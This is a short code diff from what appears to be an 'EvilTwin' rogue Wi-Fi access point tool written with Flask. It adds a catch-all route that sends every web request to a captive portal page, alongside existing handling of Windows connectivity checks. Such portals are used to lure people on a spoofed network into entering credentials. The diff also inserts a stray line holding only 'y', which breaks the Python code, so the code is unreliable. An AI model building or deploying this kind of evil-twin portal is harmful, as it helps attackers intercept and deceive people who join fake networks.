@@ -9,7 +9,6 @@ from flask import Flask, render_template
 from EvilTwin_info import selected_options  
 
 
-
 #For comands like stop procesess  -- "systemctl", "stop", "NetworkManager  
 def cmd(comand, ignore_error = False): # ignore_error so the script dont fail if we are trying to turn off a function that isnt even on
     result = subprocess.run(comand, capture_output=True, text=True)
@@ -94,6 +93,11 @@ app = Flask(__name__, template_folder=os.path.join(base_dir, "templates"))
 def show_portal():
     return render_template(PORTAL)
 
+# Normal HTTP detection requests
+@app.route("/", defaults={"path": ""})
+@app.route("/<path:path>")
+def captive_portal(path=""):
+    return show_portal()
 
 # Windows captive portal detection requests
 @app.route("/connecttest.txt")
@@ -113,7 +117,7 @@ def start_portal():
      print("PORTAL =", PORTAL)
      print("TEMPLATE FOLDER =", os.path.join(base_dir, "templates"))
 
-
+y
 def main():
     connect_to_wifi()
     starting_services()
